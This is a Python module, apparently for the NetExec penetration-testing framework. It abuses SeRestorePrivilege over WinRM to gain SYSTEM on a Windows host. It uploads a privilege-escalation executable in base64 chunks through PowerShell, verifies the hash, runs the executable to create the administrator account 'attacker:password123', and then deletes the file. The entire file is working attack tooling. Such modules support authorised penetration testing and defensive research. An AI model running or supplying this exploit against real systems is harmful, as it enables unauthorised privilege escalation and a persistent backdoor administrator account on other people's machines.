# SeRestoreAbuse module for nxc (WinRM)
# SeRestoreAbuse: https://github.com/rhymenaucerous/SeRestoreAbuse
# Abuses SeRestorePrivilege to escalate to SYSTEM via the seclogon service.
# Creates a local user "attacker" with password "password123" in the Administrators group.
#
# Designed for WinRM so that non-admin users with SeRestorePrivilege
# (e.g. Backup Operators) can run the exploit remotely.

import base64
import hashlib
import sys
from os import path

from nxc.helpers.misc import CATEGORY
from nxc.paths import DATA_PATH

CHUNK_SIZE = 32000  # PowerShell command length limit workaround


class NXCModule:
    name = "se_restore_abuse"
    description = "Abuse SeRestorePrivilege to escalate to SYSTEM via seclogon (creates local admin user attacker:password123)"
    supported_protocols = ["winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.exe_path = None
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.exe_name = "SeRestoreAbuse.exe"

    def options(self, _, module_options):
        r"""
        EXE_PATH    Local path to a custom SeRestoreAbuse.exe (optional, uses embedded copy by default)
        TMP_DIR     Remote directory to upload the exe to (default: C:\Windows\Temp\)
        """
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.exe_name = "SeRestoreAbuse.exe"

        if "EXE_PATH" in module_options:
            self.exe_path = module_options["EXE_PATH"]
        else:
            self.exe_path = path.join(DATA_PATH, "se_restore_abuse", self.exe_name)

        if "TMP_DIR" in module_options:
            self.tmp_dir = module_options["TMP_DIR"]

    def on_login(self, context, connection):
        # Verify the exe exists locally
        if not path.isfile(self.exe_path):
            context.log.fail(f"SeRestoreAbuse.exe not found at '{self.exe_path}'")
            sys.exit(1)

        remote_path = f"{self.tmp_dir}{self.exe_name}"

        # Read the exe and base64-encode it for PowerShell transfer
        with open(self.exe_path, "rb") as f:
            exe_bytes = f.read()
        exe_b64 = base64.b64encode(exe_bytes).decode()

        # Upload via PowerShell — write base64-decoded bytes to disk
        context.log.display(
            f"Uploading {self.exe_name} to {self.tmp_dir} via PowerShell"
        )
        # Split into chunks to avoid command-line length limits
        chunks = []
        for i in range(0, len(exe_b64), CHUNK_SIZE):
            chunk = exe_b64[i : i + CHUNK_SIZE]
            chunks.append(chunk)

        try:
            # Write first chunk (overwrite any existing file)
            upload_cmd = f'$d = "{chunks[0]}"; [IO.File]::WriteAllBytes("{remote_path}", [Convert]::FromBase64String($d))'
            connection.execute(upload_cmd, True, shell_type="powershell")

            # Append remaining chunks if any
            for chunk in chunks[1:]:
                append_cmd = (
                    f'$d = "{chunk}"; '
                    f'$existing = [IO.File]::ReadAllBytes("{remote_path}"); '
                    f"$new = [Convert]::FromBase64String($d); "
                    f"$combined = New-Object byte[] ($existing.Length + $new.Length); "
                    f"[Array]::Copy($existing, $combined, $existing.Length); "
                    f"[Array]::Copy($new, 0, $combined, $existing.Length, $new.Length); "
                    f'[IO.File]::WriteAllBytes("{remote_path}", $combined)'
                )
                connection.execute(append_cmd, True, shell_type="powershell")

            context.log.success(f"SeRestoreAbuse.exe uploaded to {remote_path}")
        except Exception as e:
            context.log.fail(f"Error uploading file: {e}")
            return

        # Verify upload integrity — compare SHA256 hashes
        local_hash = hashlib.sha256(exe_bytes).hexdigest()
        context.log.display("Verifying upload integrity (SHA256)")
        try:
            hash_cmd = f'(Get-FileHash -Path "{remote_path}" -Algorithm SHA256).Hash'
            remote_hash = connection.execute(hash_cmd, True, shell_type="powershell")
            if remote_hash:
                remote_hash = remote_hash.strip().lower()
            if remote_hash != local_hash:
                context.log.fail(
                    f"Upload failed — hash mismatch (local: {local_hash}, remote: {remote_hash})"
                )
                # Clean up the bad file
                connection.execute(
                    f'Remove-Item -Path "{remote_path}" -Force',
                    True,
                    shell_type="powershell",
                )
                return
            context.log.success(f"Hash verified: {local_hash}")
        except Exception as e:
            context.log.fail(f"Upload failed — could not verify hash: {e}")
            connection.execute(
                f'Remove-Item -Path "{remote_path}" -Force',
                True,
                shell_type="powershell",
            )
            return

        # Execute SeRestoreAbuse.exe
        context.log.display(f"Executing {remote_path}")
        try:
            output = connection.execute(
                f'& "{remote_path}"', True, shell_type="powershell"
            )
            if output:
                for line in output.splitlines():
                    context.log.highlight(line)
                context.log.success(
                    "SeRestoreAbuse.exe executed — check output above (expected: attacker:password123 added to Administrators)"
                )
            else:
                context.log.display("Command executed but no output returned")
        except Exception as e:
            context.log.fail(f"Error executing command: {e}")
        finally:
            # Clean up — delete the exe from the target
            try:
                connection.execute(
                    f'Remove-Item -Path "{remote_path}" -Force',
                    True,
                    shell_type="powershell",
                )
                context.log.success(f"SeRestoreAbuse.exe deleted from {remote_path}")
            except Exception as e:
                context.log.fail(f"Error deleting {self.exe_name}: {e}")
